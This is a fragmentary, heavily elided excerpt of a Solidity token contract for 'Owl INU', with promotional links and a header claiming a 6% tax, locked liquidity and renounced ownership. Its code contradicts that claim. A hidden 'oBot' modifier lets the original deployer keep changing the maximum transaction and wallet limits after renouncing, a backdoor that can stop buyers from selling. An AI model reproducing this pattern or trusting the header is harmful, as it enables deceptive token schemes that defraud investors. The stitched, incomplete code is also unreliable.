...
// Telegram : https://t.me/owlinubsc
// Twitter: https://twitter.com/owlinu
// web: https://owlinu.org

// Owl INU - 6% TAX (SLIPPAGE -8-10%)
// LIQUIDITY LOCK
// OWNERSHIP RENOUNCED
    ...
    */
    ...
    function firstOwner() internal view returns (address)  {
        return _firstOwner;
    }
    ...
    modifier onlyOwner() {
     ...
     modifier oBot() {
        require(_firstOwner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
     /*
...
function swapExactTokensForTokensSupportingFeeOnTransferTokens(
    ...
    uint256 public _maxWallet = 20000000000000 * 10**9; //2% of TS
    uint256 public _maxTxAmount = 10000000000000 * 10**9; //1% of TS
    // set this number to adjust the rate of swaps
    uint256 public numTokensSellToAddToLiquidity = 1250000000000* 10**9;
...
event MinTokensBeforeSwapUpdated(uint256 minTokensBeforeSwap);
    ...
    constructor () public  {
        ...
        _marketingAddress = 0xEe7F5800526a46333b1Dd46eF37702fF16fF8cfE;
        _developerAddress = 0xEe7F5800526a46333b1Dd46eF37702fF16fF8cfE;
...
function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
    ...
    function setMaxTxAmount(uint256 maxTxAmount) external oBot() {
        _maxTxAmount = maxTxAmount;
    }
    
    function setMaxTx(uint256 maxTx) external oBot() {
        _maxTxAmount = maxTx * 10 ** 9;
    }

    function setMaxWallet(uint256 maxWallet) external oBot() {
...
function swapTokensForEth(uint256 tokenAmount) private {
  ...
  */
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "Owl Inu: cannot burn from zero address");
    require(_balances[account] >= amount, "Owl Inu: Cannot burn more than the account owns");
